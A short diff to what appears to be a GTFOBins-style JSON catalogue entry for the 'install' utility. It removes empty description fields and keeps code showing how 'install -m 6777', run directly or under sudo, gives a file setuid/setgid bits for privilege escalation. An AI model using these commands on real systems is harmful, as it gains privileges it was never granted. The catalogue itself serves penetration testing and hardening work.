@@ -2,13 +2,13 @@
   "functions": {
     "suid": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
       }
     ]
